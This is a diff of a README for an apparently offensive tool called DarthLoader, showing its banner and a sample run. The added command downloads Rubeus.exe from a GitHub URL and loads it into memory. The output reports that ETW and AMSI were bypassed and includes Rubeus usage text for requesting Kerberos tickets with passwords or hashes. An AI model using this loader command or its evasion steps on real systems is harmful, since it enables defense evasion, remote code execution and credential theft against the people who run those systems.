@@ -11,21 +11,24 @@ DarthLoader will do the following:
 - Decrypt and run the assembly from memory.
 
 ```
- (                            (                                 
- )\ )                 )    )  )\ )              (               
-(()/(      )  (    ( /( ( /( (()/(          )   )\ )   (   (    
-/(_))  ( /(  )(   )\()))\()) /(_))  (   ( /(  (()/(  ))\  )(   
-(_))_   )(_))(()\ (_))/((_)\ (_))    )\  )(_))  ((_))/((_)(()\  
-|   \ ((_)_  ((_)| |_ | |(_)| |    ((_)((_)_   _| |(_))   ((_) 
-| |) |/ _` || '_||  _|| ' \ | |__ / _ \/ _` |/ _` |/ -_) | '_| 
-|___/ \__,_||_|   \__||_||_||____|\___/\__,_|\__,_|\___| |_| 
- 
-PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe testing123
-[+] ETW bypassed!
-[+] Amsi bypassed!
-[*] Downloading and encrypting assembly with the key: testing123
-[!] .Net assembly downloaded!
-[*] Decrypting and executing assembly...
+PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe testing123 https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe test
+
+ _______                     __     __       __                              __
+|       \                   |  \   |  \     |  \                            |  \
+| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______
+| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \
+| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
+| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
+| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$
+| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$
+ \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$
+
+
+[!] ETW bypassed!
+[!] Amsi bypassed!
+[*] Downloading and encrypting assembly with the key: test
+[+] Encrypted assembly loaded into memory...
+[+] Hit any key to run...
 
    ______        _
   (_____ \      | |
@@ -44,6 +47,8 @@ PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe test
 
     Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
         Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]
+
+
 <-----SNIP----->
 ```
 
